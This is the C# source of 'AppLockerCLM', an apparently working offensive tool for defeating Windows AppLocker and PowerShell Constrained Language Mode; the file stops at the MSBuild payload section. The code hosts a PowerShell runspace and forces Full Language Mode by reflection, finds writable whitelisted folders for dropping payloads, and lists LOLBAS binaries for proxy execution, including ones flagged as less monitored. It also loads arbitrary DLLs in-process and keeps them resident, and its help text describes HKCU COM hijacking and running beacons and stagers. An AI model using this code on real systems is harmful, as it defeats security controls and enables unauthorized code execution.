using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Xml;
using Microsoft.Win32;

// AppLockerCLM - AppLocker Recon & PowerShell Constrained Language Mode Bypass Tool
//
// BYPASS STRATEGY:
//   When this .NET executable is allowed by AppLocker (e.g., placed in a whitelisted
//   path or signed), it can host the PowerShell runtime in-process.  An in-process
//   runspace created via RunspaceFactory is NOT subject to CLM enforcement the same
//   way that powershell.exe is — AppLocker enforces CLM on the powershell.exe host
//   process, but a custom .NET host that directly creates a Runspace can set
//   InitialSessionState.LanguageMode = FullLanguage and additionally patch the
//   ExecutionContext._languageMode field via reflection to force Full Language Mode
//   regardless of what AppLocker/SRP policies are in place.
//
// COMMANDS:
//   (none)                     Auto detect: CLM status, AppLocker policy, writable paths, LOLBAS
//   check                      Detailed policy analysis (rules, wildcards, writable paths)
//   shell                      Interactive PowerShell in Full Language Mode
//   exec <cmd>                 Run a single PS command in Full Language Mode
//   script <path.ps1>          Run a script file in Full Language Mode
//   msbuild <out.csproj> [cmd] Generate an MSBuild .csproj bypass payload
//   writable                   Enumerate writable directories in AppLocker allowed paths
//   lolbas                     List available LOLBAS binaries
//   help                       Show help

namespace AppLockerCLM
{
    class Program
    {
        static Runspace _runspace;
        static bool _quiet;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hModule);

        static void Main(string[] args)
        {
            Console.CancelKeyPress += (s, e) =>
            {
                e.Cancel = false;
                CleanupRunspace();
                Environment.Exit(0);
            };

            // Strip quiet flag early
            var argList = new List<string>(args);
            if (argList.Remove("-q") | argList.Remove("--quiet"))
            {
                _quiet = true;
                args = argList.ToArray();
            }

            try
            {
                if (args.Length == 0)
                {
                    Banner();
                    AutoDetect();
                    return;
                }

                Banner();

                switch (args[0].ToLower())
                {
                    case "check":
                        RunCheck();
                        break;

                    case "shell":
                        RunShell();
                        break;

                    case "exec":
                    case "run":
                        if (args.Length < 2) { Err("Usage: exec <powershell_command>"); return; }
                        RunCommand(string.Join(" ", args.Skip(1)));
                        break;

                    case "script":
                        if (args.Length < 2) { Err("Usage: script <path_to_ps1>"); return; }
                        RunScript(args[1]);
                        break;

                    case "msbuild":
                        if (args.Length < 2) { Err("Usage: msbuild <output.csproj> [command]"); return; }
                        {
                            string mbCmd = args.Length > 2 ? string.Join(" ", args.Skip(2)) : null;
                            if (string.IsNullOrEmpty(mbCmd))
                            {
                                Console.Write("[?] PowerShell command to embed: ");
                                mbCmd = Console.ReadLine();
                                if (string.IsNullOrEmpty(mbCmd))
                                {
                                    Err("No command provided — aborted.");
                                    return;
                                }
                            }
                            GenerateMSBuildPayload(args[1], mbCmd);
                        }
                        break;

                    case "writable":
                        FindWritablePathsCmd();
                        break;

                    case "lolbas":
                        FindLolbas();
                        break;

                    case "loaddll":
                        if (args.Length < 2) { Err("Usage: loaddll <dll_path>"); return; }
                        LoadDll(args[1]);
                        break;

                    // ---- COM Hijack Bypass ----

                    case "comsetup":
                        // comsetup <dll_path> [ProgID]
                        if (args.Length < 2) { Err("Usage: comsetup <dll_path> [ProgID]"); return; }
                        SetupComHijack(args[1], args.Length > 2 ? args[2] : null);
                        break;

                    case "comload":
                        // comload <ProgID_or_{GUID}>
                        if (args.Length < 2) { Err("Usage: comload <ProgID_or_{GUID}>"); return; }
                        LoadComObject(args[1]);
                        break;

                    case "comclean":
                        // comclean <{GUID}_or_ProgID>
                        if (args.Length < 2) { Err("Usage: comclean <{GUID}_or_ProgID>"); return; }
                        CleanComHijack(args[1]);
                        break;

                    case "comlist":
                        ListComHijacks();
                        break;

                    case "help":
                    case "-h":
                    case "--help":
                    case "-help":
                    case "/?":
                        Help();
                        break;

                    default:
                        // If the first arg looks like an unknown flag (starts with - or /)
                        // show help instead of trying to execute it as a PS command.
                        if (args[0].StartsWith("-") || args[0].StartsWith("/"))
                        {
                            Err("Unknown option: " + args[0]);
                            Console.WriteLine();
                            Help();
                        }
                        else
                        {
                            // Treat as a bare PS command: AppLockerCLM.exe Get-Process
                            RunCommand(string.Join(" ", args));
                        }
                        break;
                }
            }
            finally
            {
                CleanupRunspace();
            }
        }

        // -------------------------------------------------------------------------
        // Output helpers
        // -------------------------------------------------------------------------

        static void Info(string msg) { if (!_quiet) Console.WriteLine("[*] " + msg); }
        static void Good(string msg) { Console.WriteLine("[+] " + msg); }
        static void Warn(string msg) { Console.WriteLine("[!] " + msg); }
        static void Err(string msg)  { Console.WriteLine("[X] " + msg); }
        static void Line()           { if (!_quiet) Console.WriteLine(); }

        // -------------------------------------------------------------------------
        // Banner / Help
        // -------------------------------------------------------------------------

        static void Banner()
        {
            if (_quiet) return;
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(@"
    _            _            _             ___ _    __  __
   /_\  _ __ _ _| |   ___  __| |_____ _ __|  __ |  |  \/  |
  / _ \| '_ \ '_| |__/ _ \/ _| / / -_) '_| (__| |__| |\/| |
 /_/ \_\ .__/_| |____\___/\__|_\_\___|_|  \___|____|_|  |_|
        |_|       AppLocker Recon & CLM Bypass Tool  v1.0
");
            Console.ResetColor();
        }

        static void Help()
        {
            Console.WriteLine(@"
USAGE:
  AppLockerCLM.exe [flags] [command] [args...]

FLAGS:
  -q, --quiet                   Suppress informational output

COMMANDS:
  (none)                        Auto-detect: CLM status, AppLocker policy, bypasses
  check                         Full policy analysis: rules, wildcards, writable paths
  shell                         Interactive PowerShell in Full Language Mode
  exec <cmd>                    Run a single PS command in Full Language Mode
  script <path.ps1>             Run a PS1 script file in Full Language Mode
  msbuild <out.csproj>          Generate MSBuild .csproj bypass payload (prompts for command)
  loaddll <dll_path>            Load DLL into this process (no new process, no registry)
  writable                      Enumerate writable paths in AppLocker allowed locations
  lolbas                        List available LOLBAS binaries

  --- COM Hijack (bypasses CLM via HKCU registration + New-Object -ComObject) ---
  comsetup <dll> [ProgID]       Register HKCU COM entry pointing to your DLL (no admin)
  comload  <ProgID|{GUID}>      Load the COM object — DllMain fires on CoCreateInstance
  comclean <{GUID}|ProgID>      Remove HKCU COM hijack registry entries
  comlist                       List all COM hijack registrations in HKCU

  help                          Show this help

APPLOCKER BYPASS TECHNIQUES:
  - In-process .NET hosting  -> FullLanguage PS runspace (this binary)
  - COM hijack via HKCU      -> DLL loaded by trusted PS process (no admin)
  - Writable allowed paths   -> drop executable/script, run it
  - Loose wildcard rules     -> execute from any dir matching the pattern
  - MSBuild in %WINDIR%      -> compile+run inline C# (.csproj)
  - LOLBAS                   -> proxy execution via whitelisted system binaries

EXAMPLES:
  AppLockerCLM.exe                                                       Auto recon
  AppLockerCLM.exe check                                                 Full policy analysis
  AppLockerCLM.exe shell                                                 Interactive Full Language PS
  AppLockerCLM.exe exec ""whoami /all""                                    Run PS command
  AppLockerCLM.exe script C:\loot\stager.ps1                             Run PS1 script
  AppLockerCLM.exe msbuild bypass.csproj                                 Generate MSBuild payload
  AppLockerCLM.exe loaddll C:\loot\beacon.dll                            Load DLL in-process
  AppLockerCLM.exe writable                                              Find writable allowed paths
  AppLockerCLM.exe comsetup C:\Windows\Temp\beacon.dll MyApp.Bypass      Register COM hijack
  AppLockerCLM.exe comload  MyApp.Bypass                                 Trigger DllMain
  AppLockerCLM.exe comclean {GUID-here}                                  Clean up registry
  AppLockerCLM.exe comlist                                               Show active hijacks
");
        }

        // -------------------------------------------------------------------------
        // Auto-detect
        // -------------------------------------------------------------------------

        static void AutoDetect()
        {
            Info("Running auto-detection...\n");

            Info("=== Language Mode ===");
            bool clm = DetectCLM();
            Line();

            Info("=== AppLocker Service ===");
            bool svcRunning = IsAppLockerServiceRunning();
            if (svcRunning)
                Warn("AppIDSvc is RUNNING — AppLocker policies are being enforced");
            else
                Good("AppIDSvc is NOT running — AppLocker not enforced");
            Line();

            Info("=== AppLocker Policy (Registry) ===");
            var policy = ReadAppLockerRegistry();
            DisplayPolicySummary(policy);
            Line();

            if (policy.HasPolicy)
            {
                Info("=== Wildcard / Loose Rules (Bypass Opportunities) ===");
                FindWildcardRules(policy);
                Line();

                Info("=== Writable Directories in Allowed Paths ===");
                FindWritableAllowedPaths(policy);
                Line();
            }
            else
            {
                Info("=== Common Writable Windows Paths ===");
                PrintCommonWritablePaths();
                Line();
            }

            Info("=== Available LOLBAS ===");
            FindLolbas();
            Line();

            Info("=== COM Hijack Availability ===");
            CheckComHijackAvailability();
            Line();

            // Summary
            if (clm || policy.HasPolicy)
            {
                Good("=== BYPASS RECOMMENDATIONS ===");
                Good("  shell                       -> interactive Full Language PS (this binary)");
                Good("  exec <cmd>                  -> run any PS command or .NET method");
                Good("  msbuild <out>               -> standalone MSBuild .csproj payload");
                Good("  comsetup <dll> [ProgID]     -> register HKCU COM entry (no admin)");
                Good("  comload <ProgID>            -> trigger DLL load via New-Object -ComObject");
                if (File.Exists(@"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"))
                    Good("  MSBuild.exe found           -> msbuild command ready");
            }
            else
            {
                Good("No CLM or AppLocker restrictions detected — standard PowerShell works.");
            }
        }

        // -------------------------------------------------------------------------
        // CLM Detection
        // -------------------------------------------------------------------------

        static bool DetectCLM()
        {
            // 1. Check __PSLockdownPolicy env var (set by WLDP/SRP when locking down PS)
            string envLockdown = Environment.GetEnvironmentVariable("__PSLockdownPolicy");
            if (!string.IsNullOrEmpty(envLockdown))
            {
                int v;
                if (int.TryParse(envLockdown, out v) && v >= 4)
                {
                    Warn("__PSLockdownPolicy = " + envLockdown + " -> ConstrainedLanguage enforced by WLDP");
                    Good("This tool bypasses CLM via in-process runspace hosting");
                    return true;
                }
            }

            // 2. Check if AppLocker is active with a policy — that implies CLM
            bool svcRunning = IsAppLockerServiceRunning();
            var policy = ReadAppLockerRegistry();
            if (svcRunning && policy.HasPolicy)
            {
                Warn("AppLocker policy active -> PowerShell CLM is likely enforced on powershell.exe");
                Good("This tool bypasses CLM via in-process runspace hosting");
                return true;
            }

            // 3. Probe our own hosted runspace language mode (should be FullLanguage after bypass)
            try
            {
                InitRunspace();
                using (var pipe = _runspace.CreatePipeline())
                {
                    pipe.Commands.AddScript("$ExecutionContext.SessionState.LanguageMode");
                    var res = pipe.Invoke();
                    if (res.Count > 0)
                    {
                        string mode = res[0].ToString();
                        if (mode == "FullLanguage")
                            Good("Hosted runspace language mode: FullLanguage (bypass active)");
                        else
                            Warn("Hosted runspace language mode: " + mode);
                        return mode == "ConstrainedLanguage";
                    }
                }
            }
            catch (Exception ex)
            {
                Err("Language mode probe failed: " + ex.Message);
            }

            Good("No CLM indicators found");
            return false;
        }

        // -------------------------------------------------------------------------
        // AppLocker Registry Reading
        // -------------------------------------------------------------------------

        static AppLockerPolicy ReadAppLockerRegistry()
        {
            var policy = new AppLockerPolicy();

            // Primary GPO-applied policy location
            ReadSrpV2(Registry.LocalMachine,
                @"SOFTWARE\Policies\Microsoft\Windows\SrpV2", policy);

            // Also check GP objects cache
            try
            {
                using (var gpBase = Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy Objects"))
                {
                    if (gpBase != null)
                    {
                        foreach (string gpGuid in gpBase.GetSubKeyNames())
                        {
                            ReadSrpV2(gpBase,
                                gpGuid + @"\Machine\Software\Policies\Microsoft\Windows\SrpV2",
                                policy);
                        }
                    }
                }
            }
            catch { }

            return policy;
        }

        static void ReadSrpV2(RegistryKey hive, string path, AppLockerPolicy policy)
        {
            try
            {
                using (var srpKey = hive.OpenSubKey(path))
                {
                    if (srpKey == null) return;
                    ReadRuleCollections(srpKey, policy);
                }
            }
            catch { }
        }

        static void ReadRuleCollections(RegistryKey srpKey, AppLockerPolicy policy)
        {
            // AppLocker rule collection subkeys
            string[] collections = { "Exe", "Script", "Dll", "Appx", "Msi" };

            foreach (string col in collections)
            {
                try
                {
                    using (var colKey = srpKey.OpenSubKey(col))
                    {
                        if (colKey == null) continue;

                        // EnforcementMode: 0=NotConfigured, 1=Enforce, 2=AuditOnly
                        string em = colKey.GetValue("EnforcementMode") as string ?? "";
                        bool enforced = em == "1";

                        foreach (string ruleGuid in colKey.GetSubKeyNames())
                        {
                            try
                            {
                                using (var ruleKey = colKey.OpenSubKey(ruleGuid))
                                {
                                    if (ruleKey == null) continue;
                                    // AppLocker stores rule XML in a named value "Value", not the default value ""
                                    string xml = ruleKey.GetValue("Value") as string
                                              ?? ruleKey.GetValue("") as string;
                                    if (string.IsNullOrEmpty(xml)) continue;

                                    var rule = ParseRule(xml, col, enforced);
                                    if (rule != null)
                                    {
                                        policy.Rules.Add(rule);
                                        policy.HasPolicy = true;
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }
        }

        static AppLockerRule ParseRule(string xml, string collection, bool enforced)
        {
            try
            {
                var doc = new XmlDocument();
                doc.LoadXml(xml);
                var root = doc.DocumentElement;
                if (root == null) return null;

                var rule = new AppLockerRule
                {
                    Collection = collection,
                    Enforced   = enforced,
                    Id         = root.GetAttribute("Id"),
                    Name       = root.GetAttribute("Name"),
                    Action     = root.GetAttribute("Action"),     // Allow | Deny
                    UserSid    = root.GetAttribute("UserOrGroupSid"),
                    RuleType   = root.Name  // FilePathRule | FilePublisherRule | FileHashRule
                };

                var conditions = root.SelectNodes("Conditions/*");
                if (conditions != null)
                {
                    foreach (XmlNode cond in conditions)
                    {
                        switch (cond.Name)
                        {
                            case "FilePathCondition":
                                string p = cond.Attributes?["Path"]?.Value;
                                if (!string.IsNullOrEmpty(p)) rule.Paths.Add(p);
                                break;
                            case "FilePublisherCondition":
                                rule.Publisher = cond.Attributes?["PublisherName"]?.Value ?? "";
                                rule.Product   = cond.Attributes?["ProductName"]?.Value ?? "";
                                break;
                        }
                    }
                }

                return rule;
            }
            catch { return null; }
        }

        // -------------------------------------------------------------------------
        // AppLocker Analysis
        // -------------------------------------------------------------------------

        static void DisplayPolicySummary(AppLockerPolicy policy)
        {
            if (!policy.HasPolicy)
            {
                Good("No AppLocker policy found in registry");
                return;
            }

            Warn("AppLocker policy IS configured in registry");

            var allowRules = policy.Rules.Where(r => r.Action == "Allow").ToList();
            var byCol = allowRules.GroupBy(r => r.Collection).OrderBy(g => g.Key);
            foreach (var g in byCol)
            {
                Info(string.Format("  {0,-8}: {1} path, {2} publisher, {3} hash Allow rules",
                    g.Key,
                    g.Count(r => r.RuleType == "FilePathRule"),
                    g.Count(r => r.RuleType == "FilePublisherRule"),
                    g.Count(r => r.RuleType == "FileHashRule")));
            }
        }

        static void RunCheck()
        {
            Info("=== Full AppLocker + CLM Analysis ===\n");

            Info("--- Language Mode ---");
            DetectCLM();
            Line();

            Info("--- AppLocker Service ---");
            bool svcRunning = IsAppLockerServiceRunning();
            if (svcRunning)
                Warn("AppIDSvc RUNNING — policies enforced");
            else
                Good("AppIDSvc NOT running — policies likely not enforced");
            Line();

            var policy = ReadAppLockerRegistry();

            Info("--- Policy Summary ---");
            DisplayPolicySummary(policy);
            Line();

            if (!policy.HasPolicy)
            {
                Good("No AppLocker policy — all execution paths allowed");
                Line();
                Info("--- Common Writable Paths ---");
                PrintCommonWritablePaths();
                return;
            }

            Info("--- All Allow Rules ---");
            var allowRules = policy.Rules
                .Where(r => r.Action == "Allow")
                .OrderBy(r => r.Collection)
                .ToList();

            foreach (var rule in allowRules)
            {
                string detail = rule.Paths.Count > 0
                    ? string.Join("; ", rule.Paths)
                    : (!string.IsNullOrEmpty(rule.Publisher) ? "Publisher: " + rule.Publisher : "Hash rule");

                Info(string.Format("  [{0}] {1,-18} {2,-35} {3}",
                    rule.Collection,
                    rule.RuleType.Replace("File", "").Replace("Rule", ""),
                    TruncStr(rule.Name, 35),
                    detail));
            }
            Line();

            Info("--- Wildcard / Loose Rules (Potential Bypasses) ---");
            FindWildcardRules(policy);
            Line();

            Info("--- Writable Directories in Allowed Paths ---");
            FindWritableAllowedPaths(policy);
            Line();

            Info("--- Available LOLBAS ---");
            FindLolbas();
        }

        // -------------------------------------------------------------------------
        // Wildcard Rule Detection
        // -------------------------------------------------------------------------

        static void FindWildcardRules(AppLockerPolicy policy)
        {
            // "Loose" = path wildcard not anchored to a trusted root.
            // e.g.  *\App-V\*  allows execution from ANY directory named App-V
            //       C:\Users\*\Downloads\*  allows user-writable Downloads folders

            bool found = false;
            foreach (var rule in policy.Rules.Where(r => r.Action == "Allow" && r.RuleType == "FilePathRule"))
            {
                foreach (var path in rule.Paths)
                {
                    string reason;
                    if (IsLooseWildcard(path, out reason))
                    {
                        Warn(string.Format("[{0}] {1}", rule.Collection, rule.Name));
                        Warn("  Path:   " + path);
                        Warn("  Reason: " + reason);
                        Info("  -> Any directory matching this pattern can be used for execution");
                        found = true;
                    }
                }
            }

            if (!found) Info("No loose wildcard rules detected");
        }

        static bool IsLooseWildcard(string path, out string reason)
        {
            reason = "";
            if (string.IsNullOrEmpty(path)) return false;

            // Anchored to trusted system roots — these are NOT exploitable via wildcards
            string[] trustedRoots =
            {
                "%WINDIR%", "%PROGRAMFILES%", "%PROGRAMFILES(X86)%",
                "%OSDRIVE%\\WINDOWS", "%OSDRIVE%\\PROGRAM FILES",
                "C:\\WINDOWS", "C:\\PROGRAM FILES"
            };

            string upper = path.ToUpperInvariant();
            foreach (var root in trustedRoots)
                if (upper.StartsWith(root.ToUpperInvariant())) return false;

            // Starts with * — matches any path containing the folder name
            if (path.StartsWith("*"))
            {
                reason = "Path starts with '*' — matches any drive/directory prefix";
                return true;
            }

            // Starts with %USERPROFILE%, %APPDATA%, %LOCALAPPDATA%, %TEMP%, %TMP% — user writable
            string[] userRoots = { "%USERPROFILE%", "%APPDATA%", "%LOCALAPPDATA%", "%TEMP%", "%TMP%", "%HOMEPATH%" };
            foreach (var ur in userRoots)
            {
                if (upper.StartsWith(ur.ToUpperInvariant()))
                {
                    reason = "Path is in user-controlled location (" + ur + ") — writable by current user";
                    return true;
                }
            }

            // Unrecognised environment variable prefix — unknown trust level
            if (path.StartsWith("%") && path.IndexOf('%', 1) > 1)
            {
                string varName = path.Substring(1, path.IndexOf('%', 1) - 1);
                string[] knownSafe = { "WINDIR", "PROGRAMFILES", "PROGRAMFILES(X86)", "OSDRIVE", "SYSTEMROOT", "SYSTEMDRIVE" };
                if (!knownSafe.Contains(varName.ToUpperInvariant()))
                {
                    reason = "Path uses environment variable %" + varName + "% with unknown trust level";
                    return true;
                }
            }

            return false;
        }

        // -------------------------------------------------------------------------
        // Writable Path Enumeration
        // -------------------------------------------------------------------------

        static void FindWritablePathsCmd()
        {
            var policy = ReadAppLockerRegistry();
            FindWritableAllowedPaths(policy);
        }

        static void FindWritableAllowedPaths(AppLockerPolicy policy)
        {
            var candidates = new List<string>();

            if (policy.HasPolicy)
            {
                // Pull directories from all Allow path rules
                foreach (var rule in policy.Rules.Where(r => r.Action == "Allow" && r.RuleType == "FilePathRule"))
                {
                    foreach (var p in rule.Paths)
                    {
                        string expanded = ExpandAppLockerPath(p);
                        string dir = StripToDirectory(expanded);
                        if (!string.IsNullOrEmpty(dir))
                            candidates.Add(dir);
                    }
                }
            }

            // Always include the well-known writable Windows paths — relevant even with AppLocker
            // because they often fall inside %WINDIR%\* allow rules
            candidates.AddRange(new[]
            {
                @"C:\Windows\Tasks",
                @"C:\Windows\Temp",
                @"C:\Windows\tracing",
                @"C:\Windows\Registration\CRMLog",
                @"C:\Windows\System32\FxsTmp",
                @"C:\Windows\System32\com\dmp",
                @"C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
                @"C:\Windows\System32\spool\PRINTERS",
                @"C:\Windows\System32\spool\SERVERS",
                @"C:\Windows\System32\spool\drivers\color",
                @"C:\Windows\System32\Tasks",
                @"C:\Windows\SysWOW64\Tasks",
                @"C:\Windows\debug\WIA",
            });

            int found = 0;
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (string path in candidates)
            {
                if (string.IsNullOrEmpty(path) || !seen.Add(path)) continue;
                try
                {
                    if (!Directory.Exists(path)) continue;
                    if (IsWritable(path) && !IsBlockedByDenyRule(path, policy))
                    {
                        Good("[WRITABLE] " + path);
                        found++;
                    }

                    // Check one level of subdirectories
                    foreach (string sub in Directory.GetDirectories(path).Take(15))
                    {
                        try
                        {
                            if (seen.Add(sub) && IsWritable(sub) && !IsBlockedByDenyRule(sub, policy))
                            {
                                Good("[WRITABLE] " + sub);
                                found++;
                            }
                        }
                        catch { }
                    }
                }
                catch { }
            }

            if (found == 0)
                Info("No writable paths found");
            else
                Good(string.Format("{0} writable path(s) found — drop executables/scripts here", found));
        }

        static void PrintCommonWritablePaths()
        {
            // Convenience: show writable status for common Windows paths
            var paths = new[]
            {
                @"C:\Windows\Tasks", @"C:\Windows\Temp", @"C:\Windows\tracing",
                @"C:\Windows\System32\spool\PRINTERS", @"C:\Windows\System32\spool\SERVERS",
                @"C:\Windows\System32\spool\drivers\color", @"C:\Windows\System32\Tasks",
                @"C:\Windows\Registration\CRMLog",
                Environment.GetEnvironmentVariable("TEMP") ?? "",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            };
            foreach (var p in paths)
            {
                if (string.IsNullOrEmpty(p)) continue;
                bool exists = Directory.Exists(p);
                bool writable = exists && IsWritable(p);
                if (writable) Good("[WRITABLE] " + p);
                else if (exists && !_quiet) Info("[read-only] " + p);
            }
        }

        static string ExpandAppLockerPath(string path)
        {
            // AppLocker uses %OSDRIVE% which is NOT a real Windows environment variable.
            // Map it and other AppLocker-specific macros before calling ExpandEnvironmentVariables.
            path = path.Replace("%OSDRIVE%",       Environment.GetEnvironmentVariable("SystemDrive") ?? "C:");
            path = path.Replace("%WINDIR%",        Environment.GetEnvironmentVariable("SystemRoot")  ?? @"C:\Windows");
            path = path.Replace("%SYSTEM32%",      Environment.GetFolderPath(Environment.SpecialFolder.System));
            return Environment.ExpandEnvironmentVariables(path);
        }

        static string StripToDirectory(string path)
        {
            if (string.IsNullOrEmpty(path)) return null;
            path = path.TrimEnd('\\', '/');

            // Remove trailing wildcard file patterns: C:\Windows\*  or  C:\Windows\*.exe
            while (!string.IsNullOrEmpty(path) && (path.EndsWith("*") || path.EndsWith("?")))
                path = Path.GetDirectoryName(path)?.TrimEnd('\\', '/') ?? "";

            // If the filename portion contains a wildcard, take the directory
            string fn = Path.GetFileName(path);
            if (!string.IsNullOrEmpty(fn) && (fn.Contains("*") || fn.Contains("?")))
                path = Path.GetDirectoryName(path) ?? "";

            return string.IsNullOrEmpty(path) ? null : path;
        }

        static bool IsBlockedByDenyRule(string path, AppLockerPolicy policy)
        {
            foreach (var rule in policy.Rules.Where(r => r.Action == "Deny" && r.RuleType == "FilePathRule"))
            {
                foreach (var rulePath in rule.Paths)
                {
                    try
                    {
                        string expanded = ExpandAppLockerPath(rulePath);
                        string dir = StripToDirectory(expanded);
                        if (!string.IsNullOrEmpty(dir) &&
                            path.StartsWith(dir, StringComparison.OrdinalIgnoreCase))
                            return true;
                    }
                    catch { }
                }
            }
            return false;
        }

        static bool IsWritable(string dir)
        {
            try
            {
                // Must be able to list the directory — write-only dirs (e.g. C:\Windows\System32\Tasks)
                // allow file creation but deny listing, making them impractical for dropping payloads
                Directory.GetFiles(dir);

                string tmp = Path.Combine(dir, Guid.NewGuid().ToString("N") + ".tmp");
                using (File.Create(tmp, 1, FileOptions.DeleteOnClose)) { }
                return true;
            }
            catch { return false; }
        }

        // -------------------------------------------------------------------------
        // LOLBAS Enumeration
        // -------------------------------------------------------------------------

        static void FindLolbas()
        {
            var lolbas = new Dictionary<string, string>
            {
                // .NET / MSBuild — primary AppLocker bypass vectors
                { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                    "Compile & run inline C# via .csproj  [x86]" },
                { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
                    "Compile & run inline C# via .csproj  [x64]" },
                { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
                    "Execute .NET via /U uninstall handler [x86]" },
                { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe",
                    "Execute .NET via /U uninstall handler [x64]" },
                { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe",
                    "Load & register .NET COM DLL         [x86]" },
                { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe",
                    "Load & register .NET COM DLL         [x64]" },
                { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe",
                    "Load .NET DLL via COM+ component     [x86]" },
                { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe",
                    "Load .NET DLL via COM+ component     [x64]" },
                { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
                    "Compile C# source to EXE/DLL         [x86]" },
                { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                    "Compile C# source to EXE/DLL         [x64]" },
                // System binaries
                { @"C:\Windows\System32\mshta.exe",
                    "Execute HTA, VBScript, JScript" },
                { @"C:\Windows\System32\certutil.exe",
                    "Download files; Base64 decode/encode" },
                { @"C:\Windows\System32\rundll32.exe",
                    "Load DLL and call exported function" },
                { @"C:\Windows\System32\regsvr32.exe",
                    "Load DLL via COM scriptlet (scrobj.dll)" },
                { @"C:\Windows\System32\cmstp.exe",
                    "Execute commands via .INF auto-apply" },
                { @"C:\Windows\System32\wmic.exe",
                    "Execute payload via XSL transform" },
                { @"C:\Windows\System32\msiexec.exe",
                    "Execute arbitrary code via MSI package" },
                { @"C:\Windows\System32\bitsadmin.exe",
                    "Download files via BITS service" },
                { @"C:\Windows\System32\forfiles.exe",
                    "Execute commands via /c switch" },
                { @"C:\Windows\System32\bash.exe",
                    "Execute via WSL (if WSL installed)" },
                { @"C:\Windows\System32\wsl.exe",
                    "Execute via WSL (if WSL installed)" },
                { @"C:\Windows\System32\odbcconf.exe",
                    "Execute DLL via response file" },
                { @"C:\Windows\System32\pcalua.exe",
                    "Execute via Program Compatibility Assistant" },
                { @"C:\Windows\System32\SyncAppvPublishingServer.exe",
                    "Execute PowerShell via command arguments" },
                { @"C:\Windows\System32\control.exe",
                    "Load DLL via .cpl Control Panel item" },
                { @"C:\Windows\System32\xwizard.exe",
                    "Load COM objects via XML wizard" },

                // Script hosts — run VBScript/JScript OUTSIDE PowerShell's language mode
                // entirely. CLM does not apply. Can call COM objects via CreateObject().
                { @"C:\Windows\System32\wscript.exe",
                    "Execute VBScript/JScript — bypasses CLM entirely (no PS language mode)" },
                { @"C:\Windows\System32\cscript.exe",
                    "Execute VBScript/JScript (console) — bypasses CLM entirely" },

                // Microsoft.Workflow.Compiler — same capability as MSBuild CodeTaskFactory
                // (compiles + executes arbitrary C#) but far less commonly monitored.
                // Lives in %WINDIR%\Microsoft.NET\Framework[64] — always AppLocker-allowed.
                // Usage: Microsoft.Workflow.Compiler.exe payload.xoml payload.rules
                { @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe",
                    "Compile & run arbitrary C# from XOML file — less monitored than MSBuild [x64]" },
                { @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe",
                    "Compile & run arbitrary C# from XOML file — less monitored than MSBuild [x86]" },
            };

            int count = 0;
            foreach (var lb in lolbas)
            {
                if (File.Exists(lb.Key))
                {
                    Good(string.Format("  {0,-38} {1}", Path.GetFileName(lb.Key), lb.Value));
                    count++;
                }
            }

            if (count == 0)
                Info("No LOLBAS found at default paths");
            else
            {
                Line();
                Good(string.Format("{0} LOLBAS available", count));
                Info("MSBuild payload: use 'AppLockerCLM.exe msbuild out.csproj' to generate");
                Info("DLL payload:     use 'AppLockerCLM.exe loaddll <dll_path>' to load in-process");
            }
        }

        // -------------------------------------------------------------------------
        // -------------------------------------------------------------------------
        // LoadDll — load a pre-compiled DLL directly into this process
        //
        // Advantage over comsetup/comload:
        //   No registry touches, no child process, one command.
        //   DllMain(DLL_PROCESS_ATTACH) fires immediately inside our process.
        //   AppLocker DLL rules are off by default — DLL loads unrestricted.
        //
        // Advantage over rundll32:
        //   rundll32 spawns a new process (AppLocker EXE check applies to that process).
        //   LoadLibrary runs inside our already-trusted process — no new process created.
        // -------------------------------------------------------------------------

        static void LoadDll(string dllPath)
        {
            if (!File.Exists(dllPath))
            {
                Err("File not found: " + dllPath);
                return;
            }

            Info("Loading DLL into current process...");
            Info("Method: LoadLibrary P/Invoke (no new process, no registry)");
            Info("Path:   " + dllPath);
            Line();

            IntPtr hModule = LoadLibrary(dllPath);

            if (hModule == IntPtr.Zero)
            {
                int err = Marshal.GetLastWin32Error();
                Err(string.Format("LoadLibrary failed — Win32 error {0}", err));

                // Common error codes to help diagnose
                switch (err)
                {
                    case 2:   Err("ERROR_FILE_NOT_FOUND — DLL or a dependency not found"); break;
                    case 5:   Err("ERROR_ACCESS_DENIED — check file permissions"); break;
                    case 193: Err("ERROR_BAD_EXE_FORMAT — architecture mismatch (x86 vs x64)?"); break;
                    case 126: Err("ERROR_MOD_NOT_FOUND — DLL dependency missing"); break;
                }
                return;
            }

            Good(string.Format("DLL loaded at 0x{0:X}", hModule.ToInt64()));
            Good("DllMain(DLL_PROCESS_ATTACH) executed — payload is running");
            Line();
            // Do NOT call FreeLibrary — keeps DLL and any spawned threads resident
            Info("DLL kept resident (FreeLibrary skipped — payload threads stay alive)");
            Info("Handle: 0x" + hModule.ToString("X"));
        }

        // -------------------------------------------------------------------------
        // MSBuild Payload Generator
